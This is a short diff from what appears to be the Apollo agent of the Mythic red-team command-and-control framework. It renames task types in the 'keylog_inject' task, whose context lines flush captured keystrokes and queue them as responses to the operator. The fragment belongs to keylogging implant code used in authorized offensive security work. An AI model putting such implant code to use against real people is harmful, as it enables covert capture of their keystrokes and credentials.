@@ -56,7 +56,7 @@ namespace Tasks
 
         private bool _completed = false;
 
-        public keylog_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public keylog_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
             _putKeylogsAction = (object p) =>
             {
@@ -68,7 +68,7 @@ namespace Tasks
                     KeylogInformation[] keylogs = _keylogs.Flush();
                     if (keylogs.Length > 0)
                     {
-                        _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse
+                        _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
                         {
                             TaskID = _data.ID,
                             Keylogs = keylogs
@@ -82,7 +82,7 @@ namespace Tasks
 
         public override void Start()
         {
-            TaskResponse resp;
+            MythicTaskResponse resp;
             try
             {
                 KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
